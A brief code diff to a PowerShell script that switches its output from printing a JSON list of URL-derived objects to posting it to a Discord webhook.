@@ -30,5 +30,5 @@ $urls | ForEach-Object {
 # Convert JSON objects to JSON format
 $jsonData = $jsonObjects | ConvertTo-Json
 
-#Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $jsonData
-Write-Host $jsonData
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $jsonData
+
